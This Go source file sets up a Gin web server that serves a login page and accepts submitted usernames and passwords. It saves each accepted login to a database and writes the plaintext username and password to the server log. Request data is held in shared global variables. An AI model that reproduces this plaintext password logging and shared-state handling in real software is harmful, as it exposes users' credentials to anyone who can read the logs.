package main

import (
	"ac/helpers"
	"ac/models"
	"html/template"
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

func main() {
	// Creates a new router (controller)
	router := gin.Default()
	// Sets html template renderer to use index.html file
	router.SetHTMLTemplate(template.Must(template.New("index/html").ParseFiles("templates/index.html")))

	// HANDLING REQUESTS ****************************************
	// Default route for users connecting
	router.GET("/", func(c *gin.Context) {
		c.HTML(http.StatusOK, "index.html", nil)
	})

	// Handler route when users submit their username and password
	router.POST("/submit", func(c *gin.Context) {
		// json model for receiving javascript data
		var loginData models.LoginData
		// Error handling
		if err := c.ShouldBindJSON(&loginData); err != nil {
			c.JSON(400, gin.H{"error": "Invalid JSON payload"})
			return
		}

		// Pass Data to our backend models
		models.Login.Username = loginData.Username
		models.Login.Password = loginData.Password

		// If the username and password pass the checks, return true
		if helpers.LoginChecks() {
			// Write the login to database
			helpers.SaveLogin()
			log.Printf("\nUsername: %s \nPassword: %s\n", models.Login.Username, models.Login.Password)

		} else {
			// Otherwise log the errors
			log.Println(models.Error)
		}
	})

	// middleware to serve static files
	router.Static("/static", "./static")
	// Runs the server on port 8080
	router.Run(":8080")

}
